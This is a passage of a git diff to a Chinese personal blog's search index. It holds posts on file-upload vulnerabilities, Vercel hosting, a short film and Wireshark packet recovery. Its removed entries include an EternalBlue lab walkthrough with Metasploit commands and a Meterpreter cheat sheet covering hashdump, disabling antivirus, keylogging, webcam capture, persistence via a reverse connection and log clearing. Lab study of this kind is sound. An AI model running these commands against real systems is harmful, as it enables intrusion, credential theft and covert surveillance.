d4a69cc02b714f33c38fa87fd63d15308bf83817ee554df04912f771eb16bc961d394c3efca134b9e6865e199c9b12332e8d23981972dfe5a2f6911f37c844965b3e88039e768d842c6d20a5b174cececa91ea534b77709956561a5bf5650caba3c495917d368922d1677dad06f0190c12205e0a83a99c6c3f657fbfaff4cbdf413651dde0cfe4cbaaf22867cdaa7cfae3a8de1dd137c761be3b67fbf0536e36c6031349653af04d9e1ac27e670bcd0bb863f91249a79a5850d593677465460a0f69477e4d6a6b28972cee39b81965add31b4b0e2d1de53e889d879419b0b5f8f1dfa7ee71290906c7f7a133f15a31230ea98e4b1262a52d2b1524b35edf82c061c94d07e742139018e16c6b38258ca3211c01d96929c4752e72b5240a056f8df50678e0218940d40b1d9c085443be49b2b76d07c120cd942eb85ceb24bfce582d6b0adeb2d005d46e63ae07370ed9e29d153840b72a5c1a6d0c31ac9b76151b6192ceddadfa3531c2c2af8f8039c9482977a7d3172e5fc569cd0b37e796f14835baffcf0120e2799b90c61f8a47ba5fd57646913cbad30334629ccab3c7dd210f1a60412dc4e9f3369e6c90f5d63553fd216858f9fc0c6383f5abbac129a6a574331e1b0965b8e1450145bdffd40542ef7e2db5974d114fdaddd428f69530268fafba8ef11ebc4cfb89e2e468acaffc3cfa34eb487dfae8de7ebfc824cf86ed910a3d432d363a89d493e36bc59810e63170c351882491118a6004f966f916be73038da66c762e23a166c2a75eef0dbe07c683e717c73b02bae79b942aae0eb51de83605a8d6a48f5b13183d0ed8b525cd5c1e85a7e4731675930540956cd0728a11f13ed64a6a4b3b34643007f9f4687cb179a13689df951b7d5e07ac7229d3f1b5f452c44ba728932d088b35c1606cf184b3b1c562017e2ab79f205fa9d74e0ca1d1db641d6379c23d79a9ce56570c2238772eaabea31f03625fe2c89008b27901260816835ddb837e734a03b84c8c82b81d8dcb6619082a7481c9195202aeb34a832d479cd2789d532877b0b1d1680ff8a3f6a00b554f2ede7557212f12bbd25389eb383edd7f0bfd25dd9e69f175404f94f4257cb22557a45a790fee861bea1e1142d702ea1fd6294db8fee01d7663f45d777872ced3906f806998888830a3c474693200f49d2a4b7ead027018b267fa8e46826e94aebc386eb1aad9515b51af1d90f1a43a1bc4f4f40912068d20ef61f91753f5d01d1bc7cd898f41c1edd7453f3aa25faf1db2313cea66d04d0a1972072b58df097fd558e87a542328d88fca98cc305f886731d94f492fc92e752e389c28660f6b539c2ca02d0cd5cf7e520a5e6993ab206dae0f923f69659167910d6c915abb54a5729d348926df69e7f053c9464b40fba6b9d9d19e7de648aae668e7d9afa83c543c6d84b1ade7022411c35500233ffa7829b8b125b55ba2bc8d22c6d480945aa1c77ea02bc6d16b39fa21067c58de5aa8e905bdd2554f6a63b4e3133a5815d97973abc5d38c8772f72d6a6add25f039852df5aac737c0b0a37ea352f5df178b5f2f2dc4f36f2f292355941acc7bb32fe0abb5e04309889da54ac107145e484c24a644d8c5cc44a36569e453a9977629c56d289e114efa1f32025dfb3e71f3fec5d8668647cad8d943aca034720e604c21eb69ac5431ef9132390d816117f906ed5f3a4d78b51891414280dce82de75cb933a7c08101fde25f322ef6233f7af6203dbaf9561c63e1c152d28a2d14be3dbc7052d63ec3a410444fb5b81de961405281de41e9245c10b05fc7e8d31ac21e761c0217f94b57fc50043be3f8c8964df71ad6a4b98f2a50d25f880c61107d270db270c612e73c60a79da612cd920db9aefe0ffe6ed9f7a8fe476d425cb832c161298fd7ec6c2e9349af6484a28a4fbf887d69441f96aeacb6a7ce9c22545c4d905b7f4611c9a8c838ddead90e6b9f5777d9e2c03fd7bc2ccaeafd842f5834f12e2e2379c58bd3ad233eab93732595cd48fba789dd546b58c0757c8646c116eefb356cea86af006cb360ef1a126ada0152847ba5028b5b1237e1f637f220413ea4bf437102238</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-up">
-      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-up">加密文章，密码在明信片上哦</span>
-      </label>
-    </div>
-  </div>
+    <title>文件上传漏洞</title>
+    <url>/2022/03/25/upload/</url>
+    <content><![CDATA[<h1 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h1><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
+<h1 id="前端JS过滤绕过"><a href="#前端JS过滤绕过" class="headerlink" title="前端JS过滤绕过"></a>前端JS过滤绕过</h1><h1 id="文件名过滤绕过"><a href="#文件名过滤绕过" class="headerlink" title="文件名过滤绕过"></a>文件名过滤绕过</h1><h1 id="Content-Type过滤绕过"><a href="#Content-Type过滤绕过" class="headerlink" title="Content-Type过滤绕过"></a>Content-Type过滤绕过</h1><h1 id="文件头过滤绕过"><a href="#文件头过滤绕过" class="headerlink" title="文件头过滤绕过"></a>文件头过滤绕过</h1><h1 id="htaccess文件上传"><a href="#htaccess文件上传" class="headerlink" title=".htaccess文件上传"></a>.htaccess文件上传</h1><h1 id="文件截断上传"><a href="#文件截断上传" class="headerlink" title="文件截断上传"></a>文件截断上传</h1><h1 id="竞争条件文件上传"><a href="#竞争条件文件上传" class="headerlink" title="竞争条件文件上传"></a>竞争条件文件上传</h1>]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>使用Vercel+Github搭建个人博客</title>
+    <url>/2022/02/15/vercel/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>相信在座的各位应该都试过用<code>Github Pages</code>来搭建个人博客，但效果却总是不不尽如人意，访问速度实在是太太太太慢了。</p>
+<p>想要提升速度，我们可以使用<a href="https://vercel.com/">Vercel</a>来给博客加速。</p>
+<p><a href="https://vercel.com/">Vercel</a>类似于github page，但远比github page强大，速度也快得多得多，而且将Github授权给vercel后，可以达到最优雅的发布体验，只需将代码轻轻一推，项目就自动更新部署了。</p>
+<h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><h2 id="注册Vercel账号"><a href="#注册Vercel账号" class="headerlink" title="注册Vercel账号"></a>注册Vercel账号</h2><h4 id="打开https-vercel-com-，点击Login。"><a href="#打开https-vercel-com-，点击Login。" class="headerlink" title="打开https://vercel.com/，点击Login。"></a>打开<code>https://vercel.com/</code>，点击<code>Login</code>。</h4><h4 id="点击Continue-with-Github，直接用GitHub账户登录。"><a href="#点击Continue-with-Github，直接用GitHub账户登录。" class="headerlink" title="点击Continue with Github，直接用GitHub账户登录。"></a>点击<code>Continue with Github</code>，直接用GitHub账户登录。</h4><h4 id="点击New-Project"><a href="#点击New-Project" class="headerlink" title="点击New Project"></a>点击<code>New Project</code></h4><h4 id="点击Add-Github-Account，关联至你的账号。"><a href="#点击Add-Github-Account，关联至你的账号。" class="headerlink" title="点击Add Github Account，关联至你的账号。"></a>点击<code>Add Github Account</code>，关联至你的账号。</h4><h4 id="选择需要的项目，点击Import-在新的界面中选择默认选项即可。"><a href="#选择需要的项目，点击Import-在新的界面中选择默认选项即可。" class="headerlink" title="选择需要的项目，点击Import,在新的界面中选择默认选项即可。"></a>选择需要的项目，点击<code>Import</code>,在新的界面中选择默认选项即可。</h4><h4 id="创建成功后，就可以看到满屏的烟花庆祝了！"><a href="#创建成功后，就可以看到满屏的烟花庆祝了！" class="headerlink" title="创建成功后，就可以看到满屏的烟花庆祝了！"></a>创建成功后，就可以看到满屏的烟花庆祝了！</h4><h4 id="在Settings-Git-Production-Branch中，设置检查GitHub中有改动的分支，Vercel将随着之同步更新。"><a href="#在Settings-Git-Production-Branch中，设置检查GitHub中有改动的分支，Vercel将随着之同步更新。" class="headerlink" title="在Settings-Git-Production Branch中，设置检查GitHub中有改动的分支，Vercel将随着之同步更新。"></a>在<code>Settings</code>-<code>Git</code>-<code>Production Branch</code>中，设置检查GitHub中有改动的分支，Vercel将随着之同步更新。</h4><h4 id="在Settings-Domains中，可以设置自己的域名。"><a href="#在Settings-Domains中，可以设置自己的域名。" class="headerlink" title="在Settings-Domains中，可以设置自己的域名。"></a>在<code>Settings</code>-<code>Domains</code>中，可以设置自己的域名。</h4><p>到这里，页面就已经创建完成了，可以到新的域名访问了，速度有明显的提升。</p>
+<h1 id="前后访问速度对比"><a href="#前后访问速度对比" class="headerlink" title="前后访问速度对比"></a>前后访问速度对比</h1><ul>
+<li>GitHub线路：</li>
+</ul>
+<p><img src="https://s2.loli.net/2022/02/17/JKrjb1nQBz8xvAN.png" alt="2"></p>
+<ul>
+<li>Vercel线路：</li>
+</ul>
+<p><img src="https://s2.loli.net/2022/02/17/Y1zaFHEZKbSn93g.png" alt="1"></p>
+<details class="folding-tag" green=""><summary> 题外话 </summary>
+              <div class="content">
+              <p>真的是气死了，本来是好好的一篇图文并茂的文章，但SM·MS图床一下子把图全给我删了，而且由于升级了Windows11，便把之前的图片删除了，没有备份。我这才发现SM·MS网站还写着“保留删除图片的权力”，真的是无语，连夜建了七牛云图床.所以还是要找靠谱的图床啊，一定要记得备份呐！！</p>
+              </div>
+            </details>
+]]></content>
+      <categories>
+        <category>博客</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+        <tag>Vercel</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>《拒绝校园贷》——大学生心理微电影</title>
+    <url>/2022/05/01/weidianying/</url>
+    <content><![CDATA[<div class="tip "><p>Tips：如有背景音乐自动播放，可以在左下角弹窗内关闭。</p>
 </div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+<div align="center" class="aspect-ratio">
+    <iframe src="https://player.bilibili.com/player.html?aid=853713641&amp;&amp;page=1&amp;as_wide=1&amp;high_quality=1&amp;danmaku=0" scrolling="yes" border="0" frameborder="no" framespacing="0" high_quality="1" danmaku="1" allowfullscreen="true"> 
+    </iframe>
+</div>
+]]></content>
+      <categories>
+        <category>视频</category>
+      </categories>
+      <tags>
+        <tag>bilibili</tag>
+      </tags>
   </entry>
   <entry>
     <title>个人博客入坑实录</title>
@@ -962,154 +1140,6 @@
       </tags>
   </entry>
   <entry>
-    <title>永恒之蓝漏洞复现</title>
-    <url>/2022/04/21/eternalblue/</url>
-    <content><![CDATA[<h1 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h1><p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
-<h1 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h1><p>目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
-<h1 id="复现环境："><a href="#复现环境：" class="headerlink" title="复现环境："></a>复现环境：</h1><p>攻击机：Linux Kali （192.168.8.242）</p>
-<p>靶机：Windows7 x64 （192.168.8.172）</p>
-<h1 id="复现过程："><a href="#复现过程：" class="headerlink" title="复现过程："></a>复现过程：</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>用nmap探测本网段存活主机 <code>nmap 192.168.8.17</code></p>
-<p><img src="https://img.anineg.space/1.png" alt="1"></p>
-<p>探测到存活主机ip，并探测到开放445端口，而永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞。</p>
-<h2 id="进入MSF框架"><a href="#进入MSF框架" class="headerlink" title="进入MSF框架"></a>进入MSF框架</h2><p>执行<code>msfconsole</code></p>
-<p><img src="https://img.anineg.space/2.png" alt="2"></p>
-<p>ms17-010代码 msf6 &gt; <code>search ms17_010</code></p>
-<p><img src="https://img.anineg.space/3.png" alt="3"></p>
-<p>在这里可以看到两个工具，其中auxiliary/scanner/smb/smb_ms17_010是永恒之蓝扫描模块,探测主机是否存在MS17_010漏洞，exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码，前者扫描漏洞，后者进行攻击。</p>
-<h2 id="使用ms17-010扫描模块"><a href="#使用ms17-010扫描模块" class="headerlink" title="使用ms17-010扫描模块"></a>使用ms17-010扫描模块</h2><p>msf6 &gt; <code>use auxiliary/scanner/smb/smb_ms17_010</code></p>
-<p>查看模块需要配置的参数  <code>show options</code></p>
-<p><img src="https://img.anineg.space/4.png" alt="4"></p>
-<p>在Required一栏中显示yes的需要填写Current Setting项</p>
-<p>如 <code>set rhosts 192.168.8.172</code></p>
-<p>执行扫描 <code>run</code></p>
-<p><img src="https://img.anineg.space/5.png" alt="5"></p>
-<p>显示可能存有永恒之蓝漏洞。</p>
-<h2 id="使用ms17-010攻击模块"><a href="#使用ms17-010攻击模块" class="headerlink" title="使用ms17-010攻击模块"></a>使用ms17-010攻击模块</h2><p>msf6 &gt; <code>use exploit/windows/smb/ms17_010_eternalblue</code></p>
-<p>查看模块需要配置的参数  <code>show options</code></p>
-<p><img src="https://img.anineg.space/6.png" alt="6"></p>
-<p>同理，设置目标IP ：<code>set rhosts 192.168.8.172</code></p>
-<p>设置用于接收从目标机弹回来的shell：<code>set  LHOST 192.168.1.11</code></p>
-<p>执行攻击 <code>run</code></p>
-<p><img src="https://img.anineg.space/7.png" alt="7"></p>
-<center>攻击成功！</center>
-
-<hr>
-<h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>使用<code>shell</code>可以进入被攻击机的Windows shell，但会有乱码。使用<code>chcp 65001</code>，改变代码页（65001为UTF-8的代码页）即恢复正常。</p>
-<p><img src="https://img.anineg.space/8.png" alt="8"></p>
-<p>使用<code>screenshot</code>进行截屏</p>
-<p><img src="https://img.anineg.space/9.png" alt="9"></p>
-<p>想从目标主机shell退出到 meterpreter ，输入：<code>exit</code></p>
-<p>要想从 meterpreter 退出到MSF框架，输入：<code>background</code></p>
-<h2 id="更多操作"><a href="#更多操作" class="headerlink" title="更多操作"></a>更多操作</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sysinfo             #查看目标主机系统信息</span><br><span class="line">run scraper         #查看目标主机详细信息</span><br><span class="line">run hashdump        #导出密码的哈希</span><br><span class="line">load kiwi           #加载</span><br><span class="line">ps                  #查看目标主机进程信息</span><br><span class="line">pwd                 #查看目标当前目录(windows)</span><br><span class="line">getlwd              #查看目标当前目录(Linux)</span><br><span class="line">search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件</span><br><span class="line">download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下</span><br><span class="line">upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程</span><br><span class="line">PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br><span class="line">idletime            #查看主机运行时间</span><br><span class="line">getuid              #查看获取的当前权限</span><br><span class="line">getsystem           #提权</span><br><span class="line">run  killav         #关闭杀毒软件</span><br><span class="line">screenshot          #截图</span><br><span class="line">webcam_list         #查看目标主机的摄像头</span><br><span class="line">webcam_snap         #拍照</span><br><span class="line">webcam_stream       #开视频</span><br><span class="line">execute  参数  -f 可执行文件   #执行可执行程序</span><br><span class="line">run getgui -u hack -p 123    #创建hack用户，密码为123</span><br><span class="line">run getgui -e                #开启远程桌面</span><br><span class="line">keyscan_start                #开启键盘记录功能</span><br><span class="line">keyscan_dump                 #显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop                 #停止键盘记录功能</span><br><span class="line">uictl  disable  keyboard     #禁止目标使用键盘</span><br><span class="line">uictl  enable   keyboard     #允许目标使用键盘</span><br><span class="line">uictl  disable  mouse        #禁止目标使用鼠标</span><br><span class="line">uictl  enable   mouse        #允许目标使用鼠标</span><br><span class="line">load                         #使用扩展库</span><br><span class="line">run				             #使用扩展库</span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接</span><br><span class="line">                                   192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line">portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br><span class="line">clearev                       #清除日志</span><br></pre></td></tr></tbody></table></figure>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">run post/windows/manage/migrate                  #自动进程迁移     </span><br><span class="line">run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上     </span><br><span class="line">run post/windows/manage/killav                   #关闭杀毒软件     </span><br><span class="line">run post/windows/manage/enable_rdp               #开启远程桌面服务     </span><br><span class="line">run post/windows/manage/autoroute                #查看路由信息     </span><br><span class="line">run post/windows/gather/enum_logged_on_users     #列举当前登录的用户     </span><br><span class="line">run post/windows/gather/enum_applications        #列举应用程序     </span><br><span class="line">run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码     </span><br><span class="line">run windows/gather/smart_hashdump                #dump出所有用户的hash</span><br></pre></td></tr></tbody></table></figure>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>靶机</tag>
-        <tag>渗透</tag>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>TCP协议传输数据还原测试</title>
-    <url>/2022/10/04/tcptest/</url>
-    <content><![CDATA[<details class="folding-tag" yellow=""><summary> 相关原理： </summary>
-              <div class="content">
-              <p>TCP（Transmission Control Protocol，传输控制协议）是基于连接的协议，也就是说，在正式收发数据前，必须和对方建立可靠的连接。一个TCP连接必须要经过三次“对话”才能建立起来，其中的过程非常复杂，我们这里只做简单、形象的介绍，你只要做到能够理解这个过程即可。我们来看看这三次对话的简单过程：主机A向主机B发出连接请求数据包：“我想给你发数据，可以吗？”，这是第一次对话；主机B向主机A发送同意连接和要求同步（同步就是两台主机一个在发送，一个在接收，协调工作）的数据包：“可以，你什么时候发？”，这是第二次对话；主机A再发出一个数据包确认主机B的要求同步：“我现在就发，你接着吧！”，这是第三次对话。三次“对话”的目的是使数据包的发送和接收同步，经过三次“对话”之后，主机A才向主机B正式发送数据。</p><p>QQ的文件发送是怎样的过程呢？通常，发送文件的计算机首先要通过消息服务器将其IP地址发送给接收计算机，当接收计算机同意接收的确认消息反馈到消息服务器后，消息服务器将据此设置好文件传输对话。随即，发送计算机与接收计算机就会在确定好的端口范围内，建立起TCP或UDP连接开始文件的检索与传输。</p><p>在默认状态下，QQ优先采用了UDP（User Data Protocol，用户数据报协议）协议传送数据，而对可靠性要求高的数据通讯系统往往使用TCP协议传输数据。与TCP协议不同，UDP协议并不提供数据传送的验证机制——在整个文件传输过程中如果出现数据报的丢失，协议本身并不能作出任何的检测或提示。因此，通常人们把UDP协议称为不可靠的传输协议。 UDP协议适用于无须应答、要求时效的软件使用，这样的设计正好与QQ追求的目标相符，所以QQ优先使用了此协议进行一切功能应用。但是，由于UDP协议具有不可靠性，常会因种种原因导致消息或数据的发送失败（很多时候会发现发送文件给对方接收时，对方根本收不到要求接收文件的消息。或是发送聊天消息时，对方根本没有收到过消息）。显然，UDP协议由于排除了信息可靠传递机制，将安全和排序等功能移交给上层应用来完成，极大降低了执行时间，使速度得到了保证。QQ在数据传输上更注重实际性能，为了获得更好的使用效果，往往可以牺牲一定的可靠性。因此，使用QQ来传输数据，在很多时候就成了一个“不错”的选择。（来自互联网）</p>
-              </div>
-            </details>
-<h1 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h1><p>将手机与电脑连接至同一局域网中。</p>
-<ul>
-<li><p>手机IP:<code>192.168.31.216</code></p>
-<p><img src="https://img.anineg.space/3454545.png" alt="Screenshot_20221004_140105"></p>
-</li>
-<li><p>电脑IP:<code>192.168.31.182</code></p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004140012.png" alt="QQ截图20221004140012"></p>
-</li>
-</ul>
-<h1 id="Wireshark抓包"><a href="#Wireshark抓包" class="headerlink" title="Wireshark抓包"></a>Wireshark抓包</h1><p>启动WireShark，选择WLAN过滤器：</p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004132831.png" alt="QQ截图20221004132831"></p>
-<p>在过滤器中输入：<code>ip.src == 192.168.31.216</code>以捕获/过滤指定ip地址（手机）数据包。</p>
-<p><img src="https://img.anineg.space/12345664556.png" alt="12345664556"></p>
-<p>此时，我们在手机上发送一张图片给电脑，我们可以看到Wireshark捕获了大量数据包。其中这一项就是我们刚刚发送的图片：</p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135150.png" alt="QQ截图20221004135150"></p>
-<p>右键，选择“追踪流=&gt;TCP流”</p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135442.png" alt="QQ截图20221004135442"></p>
-<p>数据格式选择“原始数据”，然后将其另存为新文件。</p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135514.png" alt="QQ截图20221004135514"></p>
-<h1 id="数据还原"><a href="#数据还原" class="headerlink" title="数据还原"></a>数据还原</h1><p>使用16进制编辑器（如WinHex）打开文件，找到jpg格式图片的文件头<code>FF D8 FF</code>,并把文件头前面的数据删除：</p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135748.png" alt="QQ截图20221004135748"></p>
-<p>保存后，将文件后缀改为<code>.jpg</code>，至此，文件得以还原：</p>
-<p><img src="https://img.anineg.space/QQ%E6%88%AA%E5%9B%BE20221004135901.png" alt="QQ截图20221004135901"></p>
-<div class="tag link"><a class="link-card" title="文件头标识及对应类型表" href="https://anineg.space/2022/07/10/yinxie2/#文件头标识及对应类型表："><div class="left"><img src="https://anineg.space/img/favicon.png"></div><div class="right"><p class="text">文件头标识及对应类型表</p><p class="url">https://anineg.space/2022/07/10/yinxie2/#文件头标识及对应类型表：</p></div></a></div>
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>Wireshark</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传漏洞</title>
-    <url>/2022/03/25/upload/</url>
-    <content><![CDATA[<h1 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h1><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
-<h1 id="前端JS过滤绕过"><a href="#前端JS过滤绕过" class="headerlink" title="前端JS过滤绕过"></a>前端JS过滤绕过</h1><h1 id="文件名过滤绕过"><a href="#文件名过滤绕过" class="headerlink" title="文件名过滤绕过"></a>文件名过滤绕过</h1><h1 id="Content-Type过滤绕过"><a href="#Content-Type过滤绕过" class="headerlink" title="Content-Type过滤绕过"></a>Content-Type过滤绕过</h1><h1 id="文件头过滤绕过"><a href="#文件头过滤绕过" class="headerlink" title="文件头过滤绕过"></a>文件头过滤绕过</h1><h1 id="htaccess文件上传"><a href="#htaccess文件上传" class="headerlink" title=".htaccess文件上传"></a>.htaccess文件上传</h1><h1 id="文件截断上传"><a href="#文件截断上传" class="headerlink" title="文件截断上传"></a>文件截断上传</h1><h1 id="竞争条件文件上传"><a href="#竞争条件文件上传" class="headerlink" title="竞争条件文件上传"></a>竞争条件文件上传</h1>]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>使用Vercel+Github搭建个人博客</title>
-    <url>/2022/02/15/vercel/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>相信在座的各位应该都试过用<code>Github Pages</code>来搭建个人博客，但效果却总是不不尽如人意，访问速度实在是太太太太慢了。</p>
-<p>想要提升速度，我们可以使用<a href="https://vercel.com/">Vercel</a>来给博客加速。</p>
-<p><a href="https://vercel.com/">Vercel</a>类似于github page，但远比github page强大，速度也快得多得多，而且将Github授权给vercel后，可以达到最优雅的发布体验，只需将代码轻轻一推，项目就自动更新部署了。</p>
-<h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><h2 id="注册Vercel账号"><a href="#注册Vercel账号" class="headerlink" title="注册Vercel账号"></a>注册Vercel账号</h2><h4 id="打开https-vercel-com-，点击Login。"><a href="#打开https-vercel-com-，点击Login。" class="headerlink" title="打开https://vercel.com/，点击Login。"></a>打开<code>https://vercel.com/</code>，点击<code>Login</code>。</h4><h4 id="点击Continue-with-Github，直接用GitHub账户登录。"><a href="#点击Continue-with-Github，直接用GitHub账户登录。" class="headerlink" title="点击Continue with Github，直接用GitHub账户登录。"></a>点击<code>Continue with Github</code>，直接用GitHub账户登录。</h4><h4 id="点击New-Project"><a href="#点击New-Project" class="headerlink" title="点击New Project"></a>点击<code>New Project</code></h4><h4 id="点击Add-Github-Account，关联至你的账号。"><a href="#点击Add-Github-Account，关联至你的账号。" class="headerlink" title="点击Add Github Account，关联至你的账号。"></a>点击<code>Add Github Account</code>，关联至你的账号。</h4><h4 id="选择需要的项目，点击Import-在新的界面中选择默认选项即可。"><a href="#选择需要的项目，点击Import-在新的界面中选择默认选项即可。" class="headerlink" title="选择需要的项目，点击Import,在新的界面中选择默认选项即可。"></a>选择需要的项目，点击<code>Import</code>,在新的界面中选择默认选项即可。</h4><h4 id="创建成功后，就可以看到满屏的烟花庆祝了！"><a href="#创建成功后，就可以看到满屏的烟花庆祝了！" class="headerlink" title="创建成功后，就可以看到满屏的烟花庆祝了！"></a>创建成功后，就可以看到满屏的烟花庆祝了！</h4><h4 id="在Settings-Git-Production-Branch中，设置检查GitHub中有改动的分支，Vercel将随着之同步更新。"><a href="#在Settings-Git-Production-Branch中，设置检查GitHub中有改动的分支，Vercel将随着之同步更新。" class="headerlink" title="在Settings-Git-Production Branch中，设置检查GitHub中有改动的分支，Vercel将随着之同步更新。"></a>在<code>Settings</code>-<code>Git</code>-<code>Production Branch</code>中，设置检查GitHub中有改动的分支，Vercel将随着之同步更新。</h4><h4 id="在Settings-Domains中，可以设置自己的域名。"><a href="#在Settings-Domains中，可以设置自己的域名。" class="headerlink" title="在Settings-Domains中，可以设置自己的域名。"></a>在<code>Settings</code>-<code>Domains</code>中，可以设置自己的域名。</h4><p>到这里，页面就已经创建完成了，可以到新的域名访问了，速度有明显的提升。</p>
-<h1 id="前后访问速度对比"><a href="#前后访问速度对比" class="headerlink" title="前后访问速度对比"></a>前后访问速度对比</h1><ul>
-<li>GitHub线路：</li>
-</ul>
-<p><img src="https://s2.loli.net/2022/02/17/JKrjb1nQBz8xvAN.png" alt="2"></p>
-<ul>
-<li>Vercel线路：</li>
-</ul>
-<p><img src="https://s2.loli.net/2022/02/17/Y1zaFHEZKbSn93g.png" alt="1"></p>
-<details class="folding-tag" green=""><summary> 题外话 </summary>
-              <div class="content">
-              <p>真的是气死了，本来是好好的一篇图文并茂的文章，但SM·MS图床一下子把图全给我删了，而且由于升级了Windows11，便把之前的图片删除了，没有备份。我这才发现SM·MS网站还写着“保留删除图片的权力”，真的是无语，连夜建了七牛云图床.所以还是要找靠谱的图床啊，一定要记得备份呐！！</p>
-              </div>
-            </details>
-]]></content>
-      <categories>
-        <category>博客</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
-        <tag>Vercel</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>《我不是药神》</title>
-    <url>/2022/03/17/wobushiyaoshen/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="e4a185f709a3160f4e81a8a2c3df97121832462ab493934be89d4119c463c8a3">79a8510ad980b24d8ff0ffe9bafb69aa31e2611f27017824642b1b97f26821030d5768d3bab397a2eef0bc9bef1e7ef61ce60a3f5f9301034e0f53e08f8216354d3f8bace8b457c054647f31aaf51152513038b6a2cff455092a768e640b714c33c96045a0b45cc48e682558aa568125d35d6434a3a51e9aed2088e1dde1c9f8f1783456b024c4b18f969688488b8e28e6e737db7dc705100ab30d70a81e2e9d97544d83f0558d8a80f376110ce736ce05ae6511b8e1f9423c3d3ab070ca142065e1036f333c9d35fcc9709118a878e0fe3566e7f7a32078ae09f8a571d2c2fd926548793834d8e907b1b3f7969b897be860b222ce8602c98a11a77b7b913ee76b84fba5a441d21a9d5e3ac4f81cea9347673631675c1be0ec8b9bde392bd2901dd5d15078c2bc6859f3c3bf8d92da421eaafc9c3481d88ffb94914072680306e7c8e3b1e41cf77a08787650cc4343ae9f970f6ce3ca0fb03a627b3f5418d5b87005e00b1b8ae5234a7babe0881fe5ddc9b3a4b191aafefbfb9795b15c83cff94c16480623baaad029898a1a903cf89a3abf940b136ac13b3d6aa7a43cbb9eea46698bde6284fedf1c470fbddde48dc45a4b289cc9bb16f7ff4f62734aa0f7a50e83996799c24670b88c98f651eb